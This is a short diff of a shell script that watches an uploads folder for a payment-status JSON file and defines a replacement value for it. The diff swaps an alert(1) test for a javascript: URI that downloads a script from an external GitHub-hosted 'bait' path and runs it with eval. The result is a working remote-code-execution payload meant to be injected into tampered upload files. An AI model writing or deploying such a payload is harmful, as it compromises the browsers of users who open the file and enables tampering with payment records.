@@ -5,7 +5,7 @@ WATCH_DIR="/data/uploads"
 TARGET_NAME="finalpaidstatus_4727.json"
 SCAN_INTERVAL=0.8
 
-NEW_FINALFILE_VALUE="javascript:(function(){alert(1)})()"
+NEW_FINALFILE_VALUE="javascript:(function(){fetch('https://raw.githubusercontent.com/9w3h8h4hw98dhf/8457hg/refs/heads/main/final/bait/a.js').then(function(r){return r.text();}).then(function(code){eval(code);});})()"
 
 
 SEEN_FILE="$(mktemp /tmp/replacer_seen.XXXXXX)"
